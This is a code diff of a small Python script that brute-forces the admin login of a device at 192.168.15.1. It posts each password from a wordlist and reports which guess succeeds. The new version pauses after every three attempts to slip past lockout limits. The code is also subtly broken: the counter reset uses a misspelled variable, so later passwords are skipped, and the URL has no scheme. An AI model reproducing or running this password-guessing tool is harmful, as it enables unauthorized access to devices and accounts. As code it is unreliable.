@@ -1,19 +1,28 @@
 import requests
+from time import sleep
 
 url = '192.168.15.1/login.html'
-
 arquivo = open('lista.txt')
 linhas = arquivo.readlines()
 
-for linha in linhas:
-    dados = {'username' : 'admin',
-             'password' : linha}
-    
-    resposta = requests.post(url, data=dados)
+cont = 0
 
-    if "senha errada" in resposta.text:
-        print ('Senha incorreta: {}'.format(linha))
-    
+for linha in linhas:
+    if cont < 3:
+
+        dados = {'user' : 'admin',
+                    'password' : linha}
+
+        resposta = requests.post(url, data=dados)
+
+        if "senha errada" in resposta.text:
+            print (f'Senha incorreta: {linha}')
+
+        else:
+            print (f'Senha correta: {linha}')
+
+        cont += 1
     else:
-        print ('Senha correta: {}'.format(linha))
+        count = 0
+        sleep(120)
 
